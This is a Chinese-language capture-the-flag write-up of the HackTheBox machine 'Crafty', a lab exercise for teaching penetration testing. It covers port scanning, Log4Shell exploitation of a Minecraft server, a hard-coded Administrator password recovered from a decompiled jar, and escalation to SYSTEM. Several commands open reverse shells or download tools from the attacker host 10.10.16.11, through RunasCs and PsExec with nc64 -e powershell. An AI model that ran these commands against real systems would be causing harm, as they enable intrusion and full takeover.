---
title: Crafty
pagination_prev: null
pagination_next: null
---

# 端口扫描
### 全端口扫描
~~~
┌──(kali㉿kali)-[~/Crafty]
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.11.249 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 00:25 EST
Nmap scan report for 10.10.11.249
Host is up (0.073s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds

~~~
### 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/Crafty]
└─$ sudo nmap -sT -sC -sV -p80 10.10.11.249 -oA nmap/sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:50 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.14s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds


~~~
### 漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/Crafty]
└─$ sudo nmap -sT --script=vuln -p80 10.10.11.249 -oA nmap/vuln
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:51 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.14s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 540.63 seconds



~~~
### UDP扫描
~~~
┌──(kali㉿kali)-[~/Crafty]
└─$ nmap -sU --top-ports 20 10.10.11.249 -oA nmap/UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 02:36 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.15s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 4.49 seconds

~~~

# 80(web)
访问80端口被重定向到crafty.htb这个域名

![](Pasted%20image%2020241115133208.png)

修改一下hosts文件，并且进行子域名搜集

子域名似乎没找到

~~~
┌──(kali㉿kali)-[~/Crafty]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://crafty.htb -H "Host: FUZZ.crafty.htb"   --hc 301  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crafty.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                     
=====================================================================

000037212:   400        6 L      26 W       334 Ch      "*"                                                                                                                                                                                         

Total time: 0
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 0


~~~

找不到更多的信息，试一下minecraft

# 25565(minecraft)

提到的版本是1.16.5
在寻找mc的漏洞利用的时候找到了这个[github库](https://github.com/Hololm/MCMetasploit?tab=readme-ov-file)
虽然提供的脚本在我本地没有利用成功，但是给我们提供了思路，尤其是log4j
这里我切换成了WSL环境，虚拟机的java总是出问题
### pycraft
可以使用[pycraft](https://github.com/ammaraskar/pyCraft)进行连接
ldap默认端口是389，这里收到回复，基本确定存在漏洞
![](Pasted%20image%2020241119095807.png)
下载[poc]( https://github.com/kozmer/log4j-shell-poc)
把poc中连接的命令由/bin/sh改成powershell.exe
![](Pasted%20image%2020241119100526.png)

![](Pasted%20image%2020241119190641.png)
成功拿到shell

# 提权
查看systeminfo，hotfix没有开
~~~
PS C:\users\svc_minecraft\server> systeminfo systeminfo Host Name: CRAFTY OS Name: Microsoft Windows Server 2019 Standard OS Version: 10.0.17763 N/A Build 17763 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00429-00521-62775-AA944 Original Install Date: 4/10/2020, 9:48:06 AM System Boot Time: 11/17/2024, 6:33:28 PM System Manufacturer: VMware, Inc. System Model: VMware7,1 System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz BIOS Version: VMware, Inc. VMW71.00V.23553139.B64.2403260936, 3/26/2024 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume2 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-08:00) Pacific Time (US & Canada) Total Physical Memory: 4,095 MB Available Physical Memory: 2,685 MB Virtual Memory: Max Size: 4,799 MB Virtual Memory: Available: 2,564 MB Virtual Memory: In Use: 2,235 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: \\CRAFTY Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.11.249 [02]: fe80::2d27:9066:33bf:280b [03]: dead:beef::12a5:6889:b62f:ef43 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.
~~~
切换到家目录拿到userflag
~~~
PS C:\users\svc_minecraft\Desktop> ls

    Directory: C:\users\svc_minecraft\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/17/2024   6:34 PM             34 user.txt

PS C:\users\svc_minecraft\Desktop> type user.txt
50638a809e67b2f7126fb098504270f5

PS C:\users\svc_minecraft\Desktop> whoami /priv
                                
~~~

查看用户权限

whoami /priv

~~~
PS C:\users\svc_minecraft\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
~~~

whoami /groups

~~~

PS C:\users\svc_minecraft\Desktop> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
~~~

在web端发现了两个jar包，传回来分析一下

~~~
PS C:\users\svc_minecraft\server> net use \\10.10.16.11\share /user:lizi 123456
net use \\10.10.16.11\share /user:lizi 123456
The command completed successfully.

PS C:\users\svc_minecraft\server> copy-item server.jar \\10.10.16.11\share\servar.jar
copy-item server.jar \\10.10.16.11\share\servar.jar
PS C:\users\svc_minecraft\server>                    
~~~

使用jd-gui进行反编译

发现了一个可疑的字符串，找一下是用来干什么的

![](Pasted%20image%2020241119223003.png)

![](Pasted%20image%2020241119223551.png)

s67u84zKq8IXw
这个应该就是password

试一下Administrator登录
下载RunasCs.exe

~~~
PS C:\programdata> iwr http://10.10.16.11:80/RunasCs.exe -outfile RunasCs.exe
iwr http://10.10.16.11:80/RunasCs.exe -outfile RunasCs.exe
~~~

查看帮助文档

~~~
PS C:\programdata> ./RunasCs.exe --help
./RunasCs.exe --help

RunasCs v1.5 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and CreateProcess* functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     commandline for the process

Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain.
                            Default: ""
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the token of the new process.
                            Default: "2" - Interactive
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and a
                            background process will be created.
                            Default: "120000"
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process_timeout to 0.
    -p, --force-profile
                            force the creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            WARNING: If non-existent, it creates the user profile
                            directory in the C:\Users folder.
    -b, --bypass-uac
                            try a UAC bypass to spawn a process without
                            token limitations (not filtered).
    -i, --remote-impersonation                                                                                                                                                                                                                                                                                      spawn a new process and assign the token of the
                            logged on user to the main thread.

Examples:
    Run a command as a local user                                                                                                                                                                                                                                                               RunasCs.exe user1 password1 "cmd /c whoami /all"
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444                                                                                                                                                                                                                             Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
PS C:\programdata>
~~~

尝试登录，并把shell弹一个回去

~~~
PS C:\programdata> ./RunasCs.exe Administrator 's67u84zKq8IXw' powershell -r 10.10.16.11:4444 -t 0
./RunasCs.exe Administrator 's67u84zKq8IXw' powershell -r 10.10.16.11:4444 -t 0
                                                                                                                                                                                                                                     [+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 192 created in background.
PS C:\programdata>       
~~~

成功拿到system权限

~~~
(base) ┌──(lizi㉿lizi)-[/tmp]
└─$ sudo rlwrap -cAr nc -lvnp 4444
[sudo] password for lizi:
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.11.249] 49706
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
~~~

拿到rootflag

~~~
PS C:\Users\Administrator\Desktop> type root.txt
type root.txt
34c5a2d5e297c430090e0d9e61c2c34d
~~~

## 再次提权
需要提权到nt authority

下载[psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

~~~
PS C:\Users\Administrator\Desktop> iwr http://10.10.16.11:80/nc64.exe -outfile nc64.exe
iwr http://10.10.16.11:80/nc64.exe -outfile nc64.exe
PS C:\Users\Administrator\Desktop> iwr http://10.10.16.11:80/PsExec.exe -outfile PsExec.exe
iwr http://10.10.16.11:80/PsExec.exe -outfile PsExec.exe
PS C:\Users\Administrator\Desktop> iwr http://10.10.16.11:80/PsExec64.exe -outfile PsExec64.exe
iwr http://10.10.16.11:80/PsExec64.exe -outfile PsExec64.exe
~~~

查看帮助文档

~~~
PS C:\Users\Administrator\Desktop> ./PsExec64.exe --help
./PsExec64.exe --help
                                                                                                                                                                                                                                                                                                                           PsExec v2.43 - Execute processes remotely                                                                                                                                                                                                                                                                                  Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com                                                                                                                                                                                                                                                                                        
SYSINTERNALS SOFTWARE LICENSE TERMS
These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please read them.They apply to the software you are downloading from technet.microsoft.com / sysinternals, which includes the media on which you received it, if any.The terms also apply to any Sysinternals                                                                                                                                                                                                                                                                                                                   * updates,                                                                                                                                                                                                                                                                                                                 *supplements,
*Internet - based services,
*and support services
for this software, unless other terms accompany those items.If so, those terms apply.
BY USING THE SOFTWARE, YOU ACCEPT THESE TERMS.IF YOU DO NOT ACCEPT THEM, DO NOT USE THE SOFTWARE.                                                                                                                                                                                                                          
If you comply with these license terms, you have the rights below.                                                                                                                                                                                                                                                         INSTALLATION AND USER RIGHTS
You may install and use any number of copies of the software on your devices.
                                                                                                                                                                                                                                                                                                                           SCOPE OF LICENSE                                                                                                                                                                                                                                                                                                           The software is licensed, not sold.This agreement only gives you some rights to use the software.Sysinternals reserves all other rights.Unless applicable law gives you more rights despite this limitation, you may use the software only as expressly permitted in this agreement.In doing so, you must comply with any technical limitations in the software that only allow you to use it in certain ways.You may not
* work around any technical limitations in the software;                                                                                                                                                                                                                                                                   *reverse engineer, decompile or disassemble the software, except and only to the extent that applicable law expressly permits, despite this limitation;                                                                                                                                                                    *make more copies of the software than specified in this agreement or allowed by applicable law, despite this limitation;
*publish the software for others to copy;                                                                                                                                                                                                                                                                                  *rent, lease or lend the software;                                                                                                                                                                                                                                                                                         *transfer the software or this agreement to any third party; or                                                                                                                                                                                                                                                            * use the software for commercial software hosting services.

SENSITIVE INFORMATION                                                                                                                                                                                                                                                                                                      Please be aware that, similar to other debug tools that capture  process state  information, files saved by Sysinternals tools may include personally identifiable or other sensitive information(such as usernames, passwords, paths to files accessed, and paths to registry accessed).By using this software, you acknowledge that you are aware of this and take sole responsibility for any personally identifiable or other sensitive information provided to Microsoft or any other party through your use of the software.
                                                                                                                                                                                                                                                                                                                           DOCUMENTATION                                                                                                                                                                                                                                                                                                              Any person that has valid access to your computer or internal network may copy and use the documentation for your internal, reference purposes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       EXPORT RESTRICTIONS                                                                                                                                                                                                                                                                                                        The software is subject to United States export laws and regulations.You must comply with all domestic and international export laws and regulations that apply to the software.These laws include restrictions on destinations, end users and end use.For additional information, see www.microsoft.com / exporting .                                                                                                                                                                                                                                                                                                                                SUPPORT SERVICES                                                                                                                                                                                                                                                                                                           Because this software is "as is, " we may not provide support services for it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ENTIRE AGREEMENT
This agreement, and the terms for supplements, updates, Internet - based services and support services that you use, are the entire agreement for the software and support services.                                                                                                                                                                                                                                                                                                                                                                                                                                                                  APPLICABLE LAW                                                                                                                                                                                                                                                                                                             United States.If you acquired the software in the United States, Washington state law governs the interpretation of this agreement and applies to claims for breach of it, regardless of conflict of laws principles.The laws of the state where you live govern all other claims, including claims under state consumer protection laws, unfair competition laws, and in tort.
Outside the United States.If you acquired the software in any other country, the laws of that country apply.                                                                                                                                                                                                               
LEGAL EFFECT                                                                                                                                                                                                                                                                                                               This agreement describes certain legal rights.You may have other rights under the laws of your country.You may also have rights with respect to the party from whom you acquired the software.This agreement does not change your rights under the laws of your country if the laws of your country do not permit it to do so.                                                                                                                                                                                                                                                                                                                        
DISCLAIMER OF WARRANTY
The software is licensed "as - is." You bear the risk of using it.Sysinternals gives no express warranties, guarantees or conditions.You may have additional consumer rights under your local laws which this agreement cannot change.To the extent permitted under your local laws, sysinternals excludes the implied warranties of merchantability, fitness for a particular purpose and non - infringement.
                                                                                                                                                                                                                                                                                                                           LIMITATION ON AND EXCLUSION OF REMEDIES AND DAMAGES
You can recover from sysinternals and its suppliers only direct damages up to U.S.$5.00.You cannot recover any other damages, including consequential, lost profits, special, indirect or incidental damages.
This limitation applies to
* anything related to the software, services, content(including code) on third party Internet sites, or third party programs; and
* claims for breach of contract, breach of warranty, guarantee or condition, strict liability, negligence, or other tort to the extent permitted by applicable law.
It also applies even if Sysinternals knew or should have known about the possibility of the damages.The above limitation or exclusion may not apply to you because your country may not allow the exclusion or limitation of incidental, consequential or other damages.
Please note : As this software is distributed in Quebec, Canada, some of the clauses in this agreement are provided below in French.                                                                                                                                                                                       Remarque : Ce logiciel tant distribu au Qubec, Canada, certaines des clauses dans ce contrat sont fournies ci - dessous en franais.
                   EXONRATION DE GARANTIE.Le logiciel vis par une licence est offert  tel quel .Toute utilisation de ce logiciel est  votre seule risque et pril.Sysinternals n'accorde aucune autre garantie expresse. Vous pouvez bnficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut modifier. La ou elles sont permises par le droit locale, les garanties implicites de qualit marchande, d'adquation  un usage particulier et d'absence de contrefaon sont exclues.
                   LIMITATION DES DOMMAGES - INTRTS ET EXCLUSION DE RESPONSABILIT POUR LES DOMMAGES.Vous pouvez obtenir de Sysinternals et de ses fournisseurs une indemnisation en cas de dommages directs uniquement  hauteur de 5, 00 $ US.Vous ne pouvez prtendre  aucune indemnisation pour les autres dommages, y compris les dommages spciaux, indirects ou accessoires et pertes de bnfices.

                   Cette limitation concerne :
tout ce qui est reli au logiciel, aux services ou au contenu(y compris le code) figurant sur des sites Internet tiers ou dans des programmes tiers; et                                                                                                                                                                     les rclamations au titre de violation de contrat ou de garantie, ou au titre de responsabilit stricte, de ngligence ou d'une autre faute dans la limite autorise par la loi en vigueur.

Elle s'applique galement, mme si Sysinternals connaissait ou devrait connatre l'ventualit d'un tel dommage. Si votre pays n'autorise pas l'exclusion ou la limitation de responsabilit pour les dommages indirects, accessoires ou de quelque nature que ce soit, il se peut que la limitation ou l'exclusion ci - dessus ne s'appliquera pas  votre gard.
EFFET JURIDIQUE.Le prsent contrat dcrit certains droits juridiques.Vous pourriez avoir d'autres droits prvus par les lois de votre pays. Le prsent contrat ne modifie pas les droits que vous confrent les lois de votre pays si celles-ci ne le permettent pas.

This is the first run of this program. You must accept EULA to continue.
Use -accepteula to accept EULA.

~~~
用系统权限执行nc
~~~
 ./PsExec.exe -accepteula -i -s cmd.exe /c "c:\Users\Administrator\Desktop\nc64.exe 10.10.16.11 5555 -e powershell.exe" 
~~~

~~~
PS C:\Users\Administrator\Desktop> ./PsExec.exe -accepteula -i -s cmd.exe /c "c:\Users\Administrator\Desktop\nc64.exe 10.10.16.11 5555 -e powershell.exe"
./PsExec.exe -accepteula -i -s cmd.exe /c "c:\Users\Administrator\Desktop\nc64.exe 10.10.16.11 5555 -e powershell.exe"

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Starting cmd.exe on CRAFTY...e on CRAFTY....
~~~

成功拿到nt权限

~~~
(base) ┌──(lizi㉿lizi)-[/tmp/nc.exe]
└─$ sudo rlwrap -cAr nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.11.249] 49711
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32>
~~~